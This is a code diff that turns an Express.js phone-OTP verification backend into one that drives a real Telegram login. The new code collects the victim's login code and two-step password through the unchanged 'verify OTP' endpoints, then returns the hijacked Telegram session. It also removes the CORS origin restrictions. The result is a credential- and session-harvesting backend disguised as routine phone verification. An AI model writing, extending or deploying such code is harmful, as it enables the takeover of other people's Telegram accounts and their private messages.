@@ -1,97 +1,88 @@
 require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
+const { spawn } = require('child_process');
+const path = require('path');
 
 const app = express();
-app.use(cors({
-  origin: [
-    'https://frontend-sigma-jade-61.vercel.app',
-    'http://localhost:3000',
-    'http://127.0.0.1:5500'
-  ]
-}));
+app.use(cors());
 app.use(express.json());
 
-// In-memory OTP store (fine for demo/small scale, use Redis or a DB in production).
-// Structure: { "+95912345678": { code: "123456", expiresAt: 169999999 } }
-const otpStore = new Map();
+// In-memory store for phone_code_hash
+const sessionStore = new Map();
 
-const OTP_TTL_MS = 5 * 60 * 1000; // 5 minutes
+function callPython(command, data) {
+    return new Promise((resolve, reject) => {
+        const py = spawn('python3', [
+            path.join(__dirname, 'telegram_helper.py'),
+            command,
+            JSON.stringify(data)
+        ]);
 
-function generateOtp() {
-  // 5-digit code, to match the 5-box entry screen on the frontend
-  return Math.floor(10000 + Math.random() * 90000).toString();
+        let output = '';
+        py.stdout.on('data', (data) => {
+            output += data.toString();
+        });
+
+        py.stderr.on('data', (data) => {
+            console.error(`Python Error: ${data}`);
+        });
+
+        py.on('close', (code) => {
+            try {
+                resolve(JSON.parse(output));
+            } catch (e) {
+                reject(new Error(`Failed to parse Python output: ${output}`));
+            }
+        });
+    });
 }
 
-// POST /api/send-otp  { phone: "+95912345678" }
 app.post('/api/send-otp', async (req, res) => {
-  const { phone } = req.body;
+    const { phone } = req.body;
+    if (!phone) return res.status(400).json({ error: 'Phone is required' });
 
-  if (!phone || typeof phone !== 'string') {
-    return res.status(400).json({ error: 'A valid phone number is required.' });
-  }
-
-  const code = generateOtp();
-  otpStore.set(phone, { code, expiresAt: Date.now() + OTP_TTL_MS });
-
-  try {
-    // ---------------------------------------------------------------
-    // Plug in a real SMS provider here (Twilio, Vonage, etc). Example
-    // with Twilio (npm install twilio, then uncomment):
-    //
-    // const twilio = require('twilio')(
-    //   process.env.TWILIO_ACCOUNT_SID,
-    //   process.env.TWILIO_AUTH_TOKEN
-    // );
-    // await twilio.messages.create({
-    //   body: `Your verification code is ${code}`,
-    //   from: process.env.TWILIO_FROM_NUMBER,
-    //   to: phone,
-    // });
-    // ---------------------------------------------------------------
-
-    // For now (no SMS provider configured), just log it so you can test locally.
-    console.log(`[OTP] ${phone} -> ${code}`);
-
-    return res.json({ message: 'OTP sent successfully.' });
-  } catch (err) {
-    console.error('Failed to send OTP:', err);
-    return res.status(500).json({ error: 'Failed to send OTP. Please try again.' });
-  }
+    try {
+        const result = await callPython('send_code', { phone });
+        if (result.status === 'success') {
+            sessionStore.set(phone, { phone_code_hash: result.phone_code_hash });
+            res.json({ message: 'OTP sent via Telegram' });
+        } else {
+            res.status(400).json({ error: result.message });
+        }
+    } catch (err) {
+        res.status(500).json({ error: 'Internal server error' });
+    }
 });
 
-// POST /api/verify-otp  { phone: "+95912345678", code: "123456" }
-app.post('/api/verify-otp', (req, res) => {
-  const { phone, code } = req.body;
+app.post('/api/verify-otp', async (req, res) => {
+    const { phone, code, password } = req.body;
+    const session = sessionStore.get(phone);
 
-  if (!phone || !code) {
-    return res.status(400).json({ error: 'Phone and code are required.' });
-  }
+    if (!session) return res.status(400).json({ error: 'Session not found' });
 
-  const record = otpStore.get(phone);
+    try {
+        const result = await callPython('verify_code', {
+            phone,
+            code,
+            phone_code_hash: session.phone_code_hash,
+            password
+        });
 
-  if (!record) {
-    return res.status(400).json({ error: 'No OTP was requested for this number.' });
-  }
-
-  if (Date.now() > record.expiresAt) {
-    otpStore.delete(phone);
-    return res.status(400).json({ error: 'OTP has expired. Please request a new one.' });
-  }
-
-  if (record.code !== code) {
-    return res.status(400).json({ error: 'Incorrect OTP.' });
-  }
-
-  otpStore.delete(phone);
-  return res.json({ message: 'Phone number verified.' });
+        if (result.status === 'success') {
+            sessionStore.delete(phone);
+            res.json({ message: 'Success', session: result.session });
+        } else if (result.status === 'password_required') {
+            res.json({ status: 'password_required', message: 'Two-step verification password required' });
+        } else {
+            res.status(400).json({ error: result.message });
+        }
+    } catch (err) {
+        res.status(500).json({ error: 'Internal server error' });
+    }
 });
 
-app.get('/', (req, res) => {
-  res.send('OTP backend is running.');
-});
+app.get('/', (req, res) => res.send('Telegram Session Backend Running'));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server listening on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
